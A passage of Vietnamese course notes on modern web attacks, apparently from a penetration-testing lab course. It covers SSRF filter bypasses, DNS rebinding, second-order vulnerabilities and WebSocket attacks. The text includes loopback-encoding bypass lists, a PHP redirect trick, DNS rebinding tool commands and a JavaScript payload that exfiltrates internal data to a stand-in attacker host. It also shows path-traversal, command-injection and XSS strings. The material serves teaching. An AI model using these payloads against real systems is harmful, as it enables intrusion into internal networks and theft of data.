
# 1. [Giới thiệu về Các Kỹ Thuật Tấn Công Web Hiện Đại](#1-giới-thiệu-về-các-kỹ-thuật-tấn-công-web-hiện-đại)
# 2. [Giới Thiệu về DNS Rebinding](#2-giới-thiệu-về-dns-rebinding)
# 3. [SSRF và Các Cách Bỏ Qua Bộ Lọc Cơ Bản](#3-ssrf-và-các-cách-bỏ-qua-bộ-lọc-cơ-bản)
# 4. [DNS Rebinding: Vượt qua bộ lọc SSRF](#4-dns-rebinding-vượt-qua-bộ-lọc-ssrf)
# 5. [DNS Rebinding: Vượt Qua Chính Sách Cùng Nguồn (Same-Origin Policy)](#5-dns-rebinding-vượt-qua-chính-sách-cùng-nguồn-same-origin-policy)
# 6. [Công cụ DNS Rebinding](#6-công-cụ-dns-rebinding)
# 7. [Giới thiệu về Các cuộc tấn công thứ hai (Second-Order Attacks)](#7-giới-thiệu-về-các-cuộc-tấn-công-thứ-hai-second-order-attacks)
# 8. [Lỗ hổng cấp hai(Second-Order Vulnerability)](#8-lỗ-hổng-cấp-hai-second-order-vulnerability)
# 9. [Phân tích lỗ hổng Second-Order IDOR](#9-phân-tích-lỗ-hổng-second-order-idor)
# 10. [Phân tích LFI thứ hai (Second-Order LFI)](#10-phân-tích-lfi-thứ-hai-second-order-lfi)
# 11. [Second-Order Command Injection](#11-second-order-command-injection)
# 12. [Giới Thiệu về WebSockets](#12-giới-thiệu-về-websockets)
# 13. [Tấn Công XSS qua WebSockets](#13-tấn-công-xss-qua-websockets)
# 14. [Tấn Công SQLi qua WebSockets](#14-tấn-công-sqli-qua-websockets)
# 15. [Cross-Site WebSocket Hijacking (CSWH)](#15-cross-site-websocket-hijacking-cswh)
# 16. [Công cụ Tấn công và Phòng ngừa WebSocket](#16-công-cụ-tấn-công-và-phòng-ngừa-websocket)

---
# 1. Giới thiệu về Các Kỹ Thuật Tấn Công Web Hiện Đại

Mô-đun này giới thiệu ba kỹ thuật tấn công web nâng cao: **DNS Rebinding**, **Tấn công thứ cấp (Second-Order Vulnerabilities)**, và **Tấn công WebSocket**. Trước khi bắt đầu với mô-đun này, người học nên có kiến thức cơ bản về các lỗ hổng web phổ biến như **Cross-Site Scripting (XSS)**, **SQL Injection (SQLi)**, và **Insecure Direct Object References (IDORs)**. Mô-đun **Web Attacks** là một sự chuẩn bị tốt để bạn tiếp cận các kỹ thuật tấn công này.

---

# 1. Các Kỹ Thuật Tấn Công Web Hiện Đại

#### 1. **DNS Rebinding**
**DNS Rebinding** là một kỹ thuật tấn công nâng cao dựa vào việc thay đổi thông tin trong Hệ thống Tên Miền (DNS). Kỹ thuật này cho phép kẻ tấn công vượt qua các bộ lọc **SSRF (Server Side Request Forgery)** không đủ mạnh và chính sách **Same-Origin Policy** (SOP). **Same-Origin Policy** là một cơ chế bảo mật trong trình duyệt, ngăn cản một trang web truy cập tài nguyên từ một miền khác mà không có sự cho phép. DNS Rebinding lợi dụng cơ chế này để cho phép kẻ tấn công gửi các yêu cầu từ trình duyệt của người dùng đến các máy chủ nội bộ hoặc tài nguyên mạng mà trước đó không thể tiếp cận.

#### 2. **Tấn công Thứ Cấp (Second-Order Attacks)**
Tấn công thứ cấp, hay còn gọi là **second-order injection** hoặc **delayed vulnerability**, xảy ra khi dữ liệu độc hại do người dùng cung cấp không khai thác ngay lập tức lỗ hổng tại điểm nhập ban đầu. Thay vào đó, dữ liệu này được lưu trữ trong ứng dụng web và chỉ xuất hiện khi được lấy lại, xử lý hoặc sử dụng ở một phần khác trong mã nguồn ứng dụng. Chính sự trì hoãn này khiến cho lỗ hổng trở nên khó phát hiện hơn, vì điểm "đầu tiên" có thể không bị tấn công, và kẻ tấn công có thể nghĩ rằng ứng dụng web không có lỗ hổng. Khi dữ liệu độc hại được sử dụng ở một nơi khác trong ứng dụng, lỗ hổng này có thể dẫn đến các vi phạm bảo mật nghiêm trọng.

#### 3. **Tấn công WebSocket**
**WebSockets** là một giao thức mạng cho phép truyền thông hai chiều giữa máy khách và máy chủ qua một kết nối duy nhất. Đây là một kỹ thuật quan trọng trong các ứng dụng web thời gian thực, nhưng nó cũng có thể là mục tiêu của các cuộc tấn công nếu không được bảo vệ đúng cách. Các tấn công WebSocket có thể bao gồm việc khai thác các kết nối WebSocket không bảo mật để thực hiện tấn công **Man-in-the-Middle (MITM)**, **Cross-Site WebSocket Hijacking**, hoặc gửi dữ liệu giả mạo. 

---
# 2. Giới Thiệu về DNS Rebinding

**DNS Rebinding** là một kỹ thuật tấn công nâng cao có thể vượt qua các biện pháp bảo mật không đầy đủ. Trước khi tìm hiểu cách nhận diện các ứng dụng web dễ bị tấn công bởi DNS Rebinding và cách khai thác chúng, chúng ta sẽ ôn lại một số thông tin cơ bản về **Hệ thống Tên Miền (DNS)**.

---

### Ôn lại: Hệ thống Tên Miền (DNS)

**DNS** là một hệ thống phân cấp dùng để phân giải (chuyển đổi) tên miền thành địa chỉ IP. Ví dụ, tên miền **www.inlanefreight.com** có thể được cấu hình để phân giải thành địa chỉ IP **1.2.3.4** vào buổi sáng và **5.6.7.8** vào buổi tối. Một ứng dụng điển hình của DNS có thể là **load-balancing** (cân bằng tải) qua DNS, nơi các yêu cầu được phân phối đến các máy chủ khác nhau vào các thời điểm khác nhau trong ngày.

Một phần quan trọng của DNS là **bộ nhớ đệm DNS (DNS Caching)**. Ví dụ, khi người dùng tương tác với một dịch vụ trong một thời gian dài, việc thực hiện các yêu cầu DNS trước mỗi yêu cầu HTTP sẽ tạo ra một khối lượng công việc đáng kể. Vì vậy, các phản hồi DNS sẽ được lưu trong bộ nhớ đệm trong một khoảng thời gian nhất định, và thời gian này được gọi là **TTL (Time to Live)**. Sau khi TTL hết hạn, hệ thống sẽ phải thực hiện một yêu cầu DNS mới để phân giải lại tên miền.

---

### DNS Rebinding và Cách Kẻ Tấn Công Sử Dụng

Trong tấn công **DNS Rebinding**, kẻ tấn công cấu hình một TTL ngắn cho tên miền của mình và thay đổi địa chỉ IP mà tên miền phân giải thành giữa các yêu cầu. Do DNS caching, khi người dùng truy cập vào một tên miền bị tấn công, trình duyệt sẽ lưu kết quả DNS và tiếp tục sử dụng nó trong suốt thời gian TTL còn hiệu lực. Kẻ tấn công sẽ lợi dụng đặc điểm này để thay đổi địa chỉ IP mà tên miền phân giải đến, dẫn đến việc gửi yêu cầu tới một máy chủ mà kẻ tấn công kiểm soát, từ đó có thể vượt qua các bộ lọc bảo mật hoặc chính sách Same-Origin Policy.

Kỹ thuật này có thể giúp kẻ tấn công khai thác các lỗ hổng bảo mật trong các hệ thống không bảo vệ đúng cách, chẳng hạn như **SSRF (Server-Side Request Forgery)**, hoặc các trường hợp mà chính sách **Same-Origin Policy** bị lỗi. 

---
# 3. SSRF và Các Cách Bỏ Qua Bộ Lọc Cơ Bản

Chúng ta sẽ bắt đầu với một số bộ lọc SSRF cơ bản có thể bị bỏ qua bằng các phương pháp đơn giản trước khi đi vào chi tiết về việc khai thác qua **DNS Rebinding**.

---

### 1. Mã hóa địa chỉ localhost

Một trong những bộ lọc SSRF cơ bản nhất là bộ lọc chặn các tên miền cụ thể như **localhost** hoặc **127.0.0.1**. Dưới đây là một ví dụ về một bộ lọc như vậy:

```python
def screenshot_url(url):
    scheme = urlparse(url).scheme
    domain = urlparse(url).hostname
    if not domain or not scheme:
        raise Exception('Malformed URL')
    if scheme not in ['http', 'https']:
        raise Exception('Invalid scheme')
    if not check_domain(domain):
        raise Exception('URL not allowed')
    return take_screenshot(url)

def check_domain(domain):
    if 'localhost' in domain:
        return False
    if domain == '127.0.0.1':
        return False
    return True
```

Bộ lọc `check_domain` sẽ chặn tất cả các tên miền chứa từ **localhost** hoặc địa chỉ **127.0.0.1**.

Tuy nhiên, có nhiều cách khác để biểu diễn địa chỉ IP chỉ đến máy chủ nội bộ. Dưới đây là một số ví dụ:

- **Địa chỉ địa phương**: `127.0.0.0 - 127.255.255.255`
- **Địa chỉ rút gọn**: `127.1`
- **Địa chỉ IP kéo dài**: `127.000000000000000.1`
- **Địa chỉ không có giá trị**: `0.0.0.0`
- **Địa chỉ thập phân**: `2130706433`
- **Địa chỉ hệ bát phân**: `0177.0000.0000.0001`
- **Địa chỉ hệ thập lục phân**: `0x7f000001`
- **Địa chỉ IPv6 loopback**: `0:0:0:0:0:0:0:1` (hoặc `::1`)
- **Địa chỉ IPv4 trong IPv6**: `::ffff:127.0.0.1`

Tất cả những địa chỉ này đều có thể bỏ qua bộ lọc trên và dẫn đến kết quả tương tự.

---

### 2. Bỏ Qua Qua DNS Resolution

Bây giờ, hãy xem xét một bộ lọc được cải tiến có sử dụng **DNS Resolution** để kiểm tra xem một địa chỉ IP có thuộc về một không gian IP riêng hay không:

```python
def check_domain(domain):
    if 'localhost' in domain:
        return False
    try:
        ip = ipaddress.ip_address(domain)
        if ip in ipaddress.ip_network('127.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('10.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('172.16.0.0/12'):
            return False
        if ip in ipaddress.ip_network('192.168.0.0/16'):
            return False
        if ip in ipaddress.ip_network('0.0.0.0/8'):
            return False
    except:
        pass
    return True
```

Bộ lọc này sẽ phân tích địa chỉ IP mà người dùng cung cấp và sẽ chặn các IP thuộc các mạng riêng (như **127.0.0.0/8**, **10.0.0.0/8**, **192.168.0.0/16**, v.v.).

Tuy nhiên, bộ lọc này không kiểm tra các tên miền, do đó, chúng ta có thể dễ dàng lách bộ lọc này bằng cách đăng ký một tên miền và trỏ nó đến một địa chỉ IP nội bộ. Ví dụ, **localtest.me** là một tên miền có thể được sử dụng, vì nó phân giải đến **127.0.0.1** (localhost).

Khi thực hiện truy vấn DNS với **localtest.me**, ta nhận được kết quả sau:

```bash
$ nslookup localtest.me
Server: 1.1.1.1
Address: 1.1.1.1#53

Non-authoritative answer:
Name: localtest.me
Address: 127.0.0.1
Name: localtest.me
Address: ::1
```

Với tên miền này, chúng ta có thể dễ dàng bỏ qua bộ lọc bằng cách cung cấp địa chỉ này trong URL.

---

### 3. Bỏ Qua Qua HTTP Redirect

Trong trường hợp bộ lọc DNS bị cải tiến để kiểm tra và phân giải tên miền, ta có thể tiếp tục bỏ qua bộ lọc bằng cách sử dụng **HTTP Redirects**. Nếu bộ lọc chỉ kiểm tra tên miền mà không tính đến việc chuyển hướng HTTP, ta có thể sử dụng một server web do mình kiểm soát để chuyển hướng người dùng đến một endpoint nội bộ, chẳng hạn như **127.0.0.1/debug**.

Để thực hiện điều này, ta có thể tạo một tệp PHP với mã sau và lưu trên máy chủ web của mình:

```php
<?php
header('Location: http://127.0.0.1/debug');
?>
```

Sau đó, ta có thể chạy máy chủ PHP trên máy của mình:

```bash
php -S 0.0.0.0:80
```

Khi cung cấp URL đến tệp PHP này trong ứng dụng web, bộ lọc sẽ không thể ngăn cản việc chuyển hướng HTTP và sẽ cho phép truy cập đến endpoint nội bộ của ứng dụng web.

---
# 4. DNS Rebinding: Vượt qua bộ lọc SSRF

DNS rebinding là một kỹ thuật được sử dụng để vượt qua các bộ lọc SSRF (Server-Side Request Forgery). Trong trường hợp này, chúng ta sẽ tìm hiểu cách khai thác lỗ hổng này trong một ứng dụng web như **D-Proxy**, một dịch vụ proxy URL.

### Tổng Quan Về Lỗ Hổng

**D-Proxy** cho phép người dùng chỉ định một URL, sau đó ứng dụng sẽ lấy và hiển thị nội dung của URL đó. Ứng dụng sẽ kiểm tra xem địa chỉ IP của domain có phải là IP nội bộ (private) hay không. Các chức năng kiểm tra chính của ứng dụng là:

1. **Giải quyết domain** bằng `socket.gethostbyname()`.
2. **Kiểm tra xem địa chỉ IP có phải là IP toàn cầu** bằng `ipaddress.ip_address(info).is_global`.

Nếu IP là địa chỉ nội bộ, ứng dụng sẽ từ chối truy cập.

Tuy nhiên, lỗ hổng chính là ứng dụng giải quyết domain hai lần:
- **Lần giải quyết đầu tiên**: Sử dụng `socket.gethostbyname()`, ứng dụng giải quyết domain thành một địa chỉ IP.
- **Lần giải quyết thứ hai**: Sử dụng `requests.get()`, ứng dụng lại giải quyết domain để kiểm tra xem IP có nằm trong phạm vi cho phép hay không.

Quá trình giải quyết domain hai lần này tạo ra cơ hội cho một cuộc tấn công **DNS rebinding**.

### Tấn Công DNS Rebinding

Để thực hiện cuộc tấn công này, tiến trình sẽ như sau:

1. **Cấu hình Domain Của Kẻ Tấn Công**: Kẻ tấn công sở hữu một domain (ví dụ: `attacker.htb`) và cấu hình DNS ban đầu để domain này giải quyết thành một địa chỉ IP không phải là nội bộ, ví dụ `1.1.1.1`. Các bản ghi DNS được cấu hình với TTL (Time-to-Live) thấp, đảm bảo rằng kết quả DNS sẽ hết hạn nhanh chóng.

2. **Yêu Cầu Đầu Tiên**: Kẻ tấn công gửi URL `http://attacker.htb/flag` cho ứng dụng web. Ứng dụng giải quyết domain `attacker.htb` thành `1.1.1.1`, vì vậy bộ lọc kiểm tra IP toàn cầu sẽ cho phép yêu cầu.

3. **Rebinding DNS**: Sau khi thực hiện yêu cầu đầu tiên, kẻ tấn công thay đổi cấu hình DNS của `attacker.htb` để domain này giải quyết thành `127.0.0.1` (localhost). Vì TTL của DNS rất thấp, bộ nhớ cache DNS sẽ hết hạn nhanh chóng, khiến ứng dụng web phải giải quyết lại domain.

4. **Vượt Qua Bộ Lọc**: Lần giải quyết thứ hai, `attacker.htb` sẽ giải quyết thành `127.0.0.1` (localhost), nằm trong phạm vi IP nội bộ, giúp kẻ tấn công vượt qua bộ lọc SSRF và truy cập tài nguyên bị hạn chế (ví dụ: endpoint `/flag`).

### Các Bước Để Khai Thác

1. **Cấu Hình Ban Đầu**:
   - Kẻ tấn công cấu hình domain `attacker.htb` để giải quyết thành `1.1.1.1`.
   - Cấu hình TTL thấp cho bản ghi DNS để đảm bảo thời gian hết hạn nhanh.

2. **Gửi Yêu Cầu**:
   - Kẻ tấn công gửi URL `http://attacker.htb/flag` cho ứng dụng. Ứng dụng giải quyết domain thành `1.1.1.1`, và bộ lọc SSRF cho phép yêu cầu.

3. **Rebinding DNS**:
   - Kẻ tấn công thay đổi cấu hình DNS của `attacker.htb` để giải quyết thành `127.0.0.1`.

4. **Giải Quyết Domain Lần Hai**:
   - Lần giải quyết thứ hai, `attacker.htb` sẽ giải quyết thành `127.0.0.1`, giúp kẻ tấn công truy cập được endpoint `/flag`.

### Khai Thác Ứng Dụng Web

1. **Cấu Hình DNS Trên Máy Tấn Công**:
   - Kẻ tấn công cấu hình domain `attacker.htb` để giải quyết thành `1.1.1.1` trong tệp `/etc/hosts`.
   - Sau đó, kẻ tấn công chỉnh sửa cấu hình DNS của `attacker.htb` để giải quyết thành `127.0.0.1`.

2. **Kiểm Tra Quá Trình Giải Quyết**:
   - Kẻ tấn công kiểm tra xem ứng dụng có giải quyết domain thành `1.1.1.1` trong lần đầu tiên và `127.0.0.1` trong lần thứ hai hay không.

---

# 5. DNS Rebinding: Vượt Qua Chính Sách Cùng Nguồn (Same-Origin Policy)

Sau khi đã hiểu cách vượt qua bộ lọc SSRF bằng kỹ thuật DNS rebinding, trong phần này, chúng ta sẽ thảo luận về cách sử dụng DNS rebinding để vượt qua một số hạn chế mà chính sách cùng nguồn (Same-Origin Policy) đặt ra. Điều này giúp kẻ tấn công có thể truy cập vào các ứng dụng web chỉ có thể truy cập từ mạng nội bộ của nạn nhân và có thể đánh cắp dữ liệu từ chúng.

### Cài Đặt và Phương Pháp

Mục tiêu của chúng ta là đánh cắp dữ liệu từ một ứng dụng web mà chúng ta không thể truy cập trực tiếp, ví dụ như nó chạy trong một mạng nội bộ phía sau NAT hoặc tường lửa. Vì DNS rebinding không phải là một lỗ hổng trong một ứng dụng web cụ thể, chúng ta sẽ không đi qua một ứng dụng web cụ thể mà sẽ thảo luận về phương pháp và cách khai thác DNS rebinding.

Giả sử tình huống sau: nạn nhân đang duyệt web trên máy tính xách tay công ty của mình, nằm trong mạng công ty. Mạng công ty có một ứng dụng web nội bộ chứa thông tin bảo mật tại `http://192.168.178.1/`, vì vậy ứng dụng này chỉ có thể truy cập từ mạng nội bộ của công ty. Để đánh cắp dữ liệu từ ứng dụng web nội bộ này, chúng ta có thể sử dụng DNS rebinding như sau:

### Các Bước Tấn Công

1. **Cấu Hình Tên Miền Tấn Công**: Kẻ tấn công (chúng ta) có tên miền `attacker.htb` và cấu hình máy chủ DNS với TTL thấp, sao cho tên miền này giải quyết tới địa chỉ IP của ứng dụng web, đồng thời chạy một mã JavaScript độc hại.

2. **Nạn Nhân Truy Cập Ứng Dụng Tấn Công**: Nạn nhân truy cập vào ứng dụng web của kẻ tấn công tại `http://attacker.htb`. Lúc này, DNS của `attacker.htb` sẽ giải quyết tới địa chỉ IP của ứng dụng web của kẻ tấn công và tải mã JavaScript độc hại.

3. **Cập Nhật Cấu Hình DNS (Rebinding)**: Kẻ tấn công cập nhật cài đặt DNS của tên miền `attacker.htb` để giải quyết thành `192.168.178.1` (địa chỉ IP của ứng dụng web nội bộ).

4. **Yêu Cầu HTTP của Mã JavaScript**: Mã JavaScript sẽ gửi yêu cầu HTTP GET đến `http://attacker.htb/secret`. Nhờ DNS rebinding, khi DNS của `attacker.htb` giải quyết thành `192.168.178.1`, yêu cầu sẽ được gửi tới ứng dụng web nội bộ của nạn nhân. Vì "nguồn" không thay đổi (chỉ có tên miền và địa chỉ IP thay đổi), trình duyệt của nạn nhân không xem đây là một yêu cầu "cross-origin". Do đó, mã JavaScript có thể truy cập và nhận phản hồi mà không vi phạm chính sách Same-Origin.

5. **Lấy Dữ Liệu và Đưa Ra Ngoài**: Mã JavaScript sẽ gửi dữ liệu thu được đến một tên miền do kẻ tấn công kiểm soát, ví dụ `http://exfiltrate.attacker.htb`. Kẻ tấn công có thể sử dụng cùng một phương pháp này để thao tác với ứng dụng web nội bộ bằng cách gửi các yêu cầu HTTP như PUT, POST, DELETE.

### Cấu Hình và Khai Thác

Trong ví dụ này, ứng dụng web nội bộ chạy tại `http://192.168.178.1` và có endpoint `/secret` mà kẻ tấn công muốn đánh cắp dữ liệu. Mã của endpoint này như sau:

```javascript
router.get("/secret", async (req, res) => {
  return res.status(200).send("This is secret data!");
});
```

Ứng dụng này không yêu cầu xác thực vì quản trị viên hệ thống nghĩ rằng nó không thể truy cập từ bên ngoài và vì thế coi là an toàn, nhưng điều này là sai. Sau khi cấu hình DNS đúng cách, chúng ta sẽ sử dụng **DNSRebinder** để thực hiện cuộc tấn công DNS rebinding với tên miền `http://www.attacker.htb` và địa chỉ IP của máy chủ công cộng thay thế `$PUBLIC_WEBSERVER_IP`.

Lệnh khai thác:

```bash
sudo python3 dnsrebinder.py --domain www.attacker.htb. --rebind 192.168.178.1 --ip $PUBLIC_WEBSERVER_IP --counter 1 --tcp --udp
```

Sau khi cấu hình DNS, kẻ tấn công sẽ tải mã JavaScript sau lên máy chủ của mình và bắt đầu dịch vụ exfiltration tại `http://exfiltrate.attacker.htb:1337`:

```html
<script>
startAttack();
function startAttack(){
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://www.attacker.htb/secret', true);
  xhr.onload = () => {
    fetch('http://exfiltrate.attacker.htb:1337/log?data=' + btoa(xhr.response));
  };
  xhr.send();
  setInterval(startAttack, 2000);
}
</script>
```

Mã này sẽ tự gọi lại chính nó mỗi 2 giây để tăng khả năng thành công của cuộc tấn công. Nếu nạn nhân truy cập vào website của kẻ tấn công tại `http://www.attacker.htb`, DNS rebinding sẽ được thực hiện và kẻ tấn công chỉ cần chờ đợi yêu cầu đến server exfiltration của mình.

---
DNS rebinding là một kỹ thuật tấn công có thể bỏ qua chính sách "Same-Origin", cho phép kẻ tấn công truy cập vào các ứng dụng web trong mạng nội bộ của nạn nhân, thường bị hạn chế bởi tường lửa hoặc NAT (mạng nội bộ). Kỹ thuật này khai thác lỗ hổng trong cách giải quyết tên miền và các yêu cầu HTTP, cho phép kẻ tấn công "rebind" tên miền mà người dùng truy cập để nó trỏ đến địa chỉ IP trong mạng nội bộ.

---
# 6. Công cụ DNS Rebinding
Để thực hiện các cuộc tấn công DNS rebinding, công cụ **Singularity** là một framework mạnh mẽ giúp thực hiện các cuộc tấn công này dễ dàng hơn. Để cài đặt và sử dụng Singularity, người dùng có thể làm theo các bước sau:

1. **Cài đặt Singularity**:
   ```bash
   git clone https://github.com/nccgroup/singularity
   cd singularity/cmd/singularity-server
   go build
   ```
   
2. **Chạy giao diện web Singularity**:
   ```bash
   mkdir -p ~/singularity/html
   cp singularity-server ~/singularity/
   cp -r ../../html/* ~/singularity/html/
   sudo ~/singularity/singularity-server --HTTPServerPort 80
   ```

   Sau khi cấu hình xong, Singularity sẽ khởi động DNS server tại cổng 53 và HTTP server tại cổng 80, sẵn sàng để bắt đầu cuộc tấn công.

### Quy trình Tấn Công DNS Rebinding
Quá trình tấn công sử dụng DNS rebinding có thể được thực hiện theo các bước sau:

1. **Thiết lập Tên Miền**: Kẻ tấn công sẽ cấu hình DNS để tên miền của mình (ví dụ, `attacker.htb`) trỏ đến địa chỉ IP của ứng dụng web nội bộ mà họ muốn truy cập, chẳng hạn `192.168.178.1`.

2. **Truy cập vào trang web tấn công**: Nạn nhân truy cập vào trang web tấn công (ví dụ, `http://attacker.htb`) nơi JavaScript độc hại được tải về.

3. **DNS Rebinding**: Sau khi nạn nhân truy cập, DNS của tên miền sẽ được thay đổi để trỏ tới IP nội bộ (ví dụ, `192.168.178.1`). Điều này giúp bỏ qua chính sách Same-Origin vì trình duyệt của nạn nhân sẽ gửi yêu cầu đến địa chỉ nội bộ nhưng vẫn coi đây là một yêu cầu hợp lệ vì "origin" không thay đổi.

4. **Exfiltrate Dữ Liệu**: JavaScript độc hại có thể thu thập dữ liệu từ ứng dụng web nội bộ và gửi về cho kẻ tấn công qua một máy chủ exfiltration.

---

# 7. Giới thiệu về Các cuộc tấn công thứ hai (Second-Order Attacks)

Để hiểu rõ hơn về các cuộc tấn công thứ hai, chúng ta cần phân biệt rõ giữa các lỗ hổng thứ nhất và thứ hai, cũng như cách nhận diện và khai thác chúng.

### Lỗ hổng thứ hai (Second-Order Vulnerability)
Lỗ hổng thứ hai xảy ra khi dữ liệu được người dùng cung cấp không trực tiếp gây ra sự cố tại điểm chèn đầu tiên, mà gây ra lỗ hổng khi ứng dụng web lưu trữ hoặc xử lý dữ liệu đó sau này. Điều này có nghĩa là mặc dù dữ liệu đầu vào có thể không gây nguy hiểm ngay lập tức, nhưng nếu nó được xử lý sau này (khi được lưu trữ trong cơ sở dữ liệu hoặc tái sử dụng), nó có thể kích hoạt một lỗ hổng tiềm ẩn.

Ví dụ, một cuộc tấn công XSS (Cross-Site Scripting) có thể không gây ra vấn đề ngay lập tức khi người dùng nhập liệu vào form. Tuy nhiên, khi dữ liệu này được lưu trữ và hiển thị lại sau đó (trong một trang web khác mà không được kiểm tra đúng cách), nó có thể dẫn đến việc thực thi mã JavaScript độc hại.

### Các Lỗ hổng Web Thường Gặp có Liên Quan đến Các Cuộc Tấn Công Thứ Hai
- **XSS lưu trữ (Stored XSS)**: Đây là một ví dụ điển hình của một lỗ hổng thứ hai, khi người dùng nhập mã JavaScript độc hại vào một trường dữ liệu mà ứng dụng web không kiểm tra đúng cách. Mã độc hại này chỉ được thực thi khi dữ liệu đó được lưu trữ và hiển thị lại trong một phần khác của ứng dụng.
  
- **Insecure Direct Object References (IDOR)**: Đây là một loại lỗ hổng quyền truy cập, xảy ra khi người dùng có thể truy cập trực tiếp vào một đối tượng mà họ không có quyền truy cập, thông qua việc thay đổi tham chiếu đối tượng (object reference). Ví dụ, nếu URL của trang web chứa thông tin như `http://example.com/file?id=123`, người dùng có thể thay đổi tham số `id` thành một giá trị mà họ không có quyền truy cập để lấy thông tin từ một tài nguyên khác.

### Cách Phát Hiện và Xác Nhận Lỗ Hổng IDOR
Để xác định và xác nhận một lỗ hổng IDOR, quá trình thông thường bao gồm các bước sau:

1. **Nhận diện tham chiếu đối tượng trực tiếp**: Xác định các URL hoặc các yêu cầu mà người dùng có thể can thiệp vào tham số hoặc đối tượng.
   
2. **Thay đổi tham chiếu đối tượng**: Thử thay đổi giá trị tham số trong URL hoặc yêu cầu và quan sát sự thay đổi trong kết quả của ứng dụng. Nếu người dùng có thể truy cập đối tượng mà họ không có quyền, thì đó là một lỗ hổng IDOR.

3. **Xác nhận quyền truy cập không hợp lệ**: Kiểm tra xem ứng dụng có cho phép truy cập đến các đối tượng không được phép hay không khi thay đổi tham chiếu đối tượng. Điều này có thể được thực hiện bằng cách quan sát phản hồi từ máy chủ web sau khi thay đổi tham chiếu.

---
# 8. Lỗ hổng cấp hai(Second-Order Vulnerability)

Lỗ hổng thứ cấp (Second-Order Vulnerability) xảy ra khi một dữ liệu độc hại từ người dùng không kích hoạt lỗ hổng ngay lập tức trong quá trình nhập liệu ban đầu, mà phải đợi khi ứng dụng web lưu trữ hoặc xử lý lại dữ liệu đó trong các bước tiếp theo. Điều này có nghĩa là kẻ tấn công không thể khai thác ngay lập tức mà cần một chuỗi các hành động để kích hoạt sự cố.

**Ví dụ:**  
Một ứng dụng web có thể lưu trữ dữ liệu nhập vào từ người dùng, chẳng hạn như một ô tìm kiếm. Nếu một người dùng nhập mã JavaScript độc hại (ví dụ: `<script>alert('XSS');</script>`), dữ liệu này sẽ không thực thi ngay lập tức. Tuy nhiên, khi dữ liệu đó được hiển thị lại cho người dùng khác mà không được làm sạch đúng cách, mã JavaScript sẽ được thực thi, gây ra một cuộc tấn công XSS lưu trữ.

---

### **Insecure Direct Object References (IDOR):**

Lỗ hổng Insecure Direct Object Reference (IDOR) xảy ra khi người dùng có thể truy cập trực tiếp vào các đối tượng trong ứng dụng mà không có sự kiểm tra phân quyền thích hợp. Điều này có thể dẫn đến việc người dùng truy cập và thay đổi các dữ liệu mà họ không có quyền truy cập.

**Ví dụ:**  
Giả sử ứng dụng có một URL như `http://example.com/profile?id=1234`, cho phép người dùng xem hồ sơ của mình. Tuy nhiên, nếu một người dùng có thể thay đổi giá trị của `id` trong URL thành `http://example.com/profile?id=5678`, họ có thể truy cập hồ sơ của người dùng khác mà không cần sự xác thực thêm, nếu không có kiểm tra phân quyền đúng đắn.

---

### **Local File Inclusion (LFI):**

LFI là một lỗ hổng bảo mật khi ứng dụng web cho phép người dùng nhập vào đường dẫn tệp mà không kiểm tra và làm sạch đúng cách. Điều này có thể khiến kẻ tấn công truy cập vào các tệp nhạy cảm trên hệ thống máy chủ.

**Ví dụ:**  
Giả sử ứng dụng có một tính năng cho phép người dùng tải tệp vào, và nó không kiểm tra các đường dẫn tệp đúng cách. Nếu kẻ tấn công thay đổi đầu vào thành `../../etc/passwd`, ứng dụng sẽ tải và hiển thị tệp `passwd` của hệ điều hành Linux, chứa thông tin nhạy cảm về người dùng trên hệ thống.

---

### **Command Injection:**

Lỗ hổng Command Injection xảy ra khi một ứng dụng web thực thi các lệnh hệ thống và kết hợp dữ liệu người dùng mà không làm sạch đầu vào. Kẻ tấn công có thể chèn lệnh hệ thống tùy ý vào trong đó, dẫn đến việc thực thi mã độc trên máy chủ.

**Ví dụ:**  
Giả sử ứng dụng web cho phép người dùng nhập tên máy chủ để kiểm tra tình trạng kết nối. Nếu người dùng nhập vào như sau: `localhost; ls -la`, ứng dụng có thể không kiểm tra đầu vào đúng cách, dẫn đến việc lệnh `ls -la` được thực thi trên hệ thống máy chủ, liệt kê các tệp hệ thống mà kẻ tấn công có thể khai thác.

---

# 9. Phân tích lỗ hổng Second-Order IDOR

Trong trường hợp này, chúng ta đang khám phá một lỗ hổng **Second-Order IDOR** (Insecure Direct Object Reference). Một lỗ hổng Second-Order IDOR xảy ra khi kẻ tấn công không thể khai thác trực tiếp lỗ hổng trong yêu cầu ban đầu, nhưng có thể khai thác sau này khi ứng dụng web xử lý hoặc lưu trữ dữ liệu đó. Hãy cùng phân tích các bước và phương pháp khai thác lỗ hổng này.

### **Bước 1: Xác định lỗ hổng**
Sau khi đăng nhập vào ứng dụng với tài khoản thử nghiệm (`htb-stdnt`), chúng ta có thể thấy các tệp được lưu trữ cho người dùng này. Khi nhấp vào tệp đầu tiên, ứng dụng tạo yêu cầu đến `/get_data.php?id=2`, điều này chuyển hướng đến một trang hiển thị nội dung của tệp. Tham số **`id`** trong URL là một điểm tiềm ẩn của **IDOR (Insecure Direct Object Reference)**, có thể cho phép người dùng truy cập các tệp của người dùng khác.

#### **Thử nghiệm đầu tiên với IDOR:**
Chúng ta thay đổi tham số `id` trong URL (`/get_data.php?id=1`) để cố gắng truy cập tệp của người dùng khác. Tuy nhiên, khi làm như vậy, chúng ta bị đăng xuất và một thông báo lỗi được hiển thị. Điều này cho thấy ứng dụng có **bảo vệ cơ bản** chống lại lỗ hổng **First-Order IDOR**, khi quyền truy cập vào tệp bị hạn chế sau khi người dùng bị đăng xuất.

#### **Bước 2: Phân tích mã nguồn để tìm lỗ hổng Second-Order IDOR**
Bằng cách phân tích mã nguồn của ứng dụng, chúng ta thấy rằng backend kiểm tra quyền truy cập vào tệp dựa trên tham số `id` và sau đó chuyển hướng đến `display_data.php` (nếu quyền truy cập hợp lệ) hoặc `error.php` (nếu quyền truy cập không hợp lệ). Tuy nhiên, có một vấn đề: sau khi kiểm tra quyền truy cập thất bại, biến phiên `id` vẫn giữ nguyên, và người dùng bị chuyển hướng đến `error.php`.

Vấn đề xảy ra vì biến phiên `id` chỉ bị xóa sau khi truy cập vào `error.php`, và nó vẫn được thiết lập với ID tệp trước đó. Điều này có nghĩa là kẻ tấn công có thể **vượt qua việc chuyển hướng đến `error.php`** và trực tiếp truy cập `display_data.php`, sử dụng tham số `id` để xem bất kỳ tệp nào (dù không có quyền truy cập).

Đây là **đoạn mã quan trọng** chứa lỗ hổng:

```php
// get_data.php
session_start();
require_once ('db.php');
if(!$_SESSION['user']){
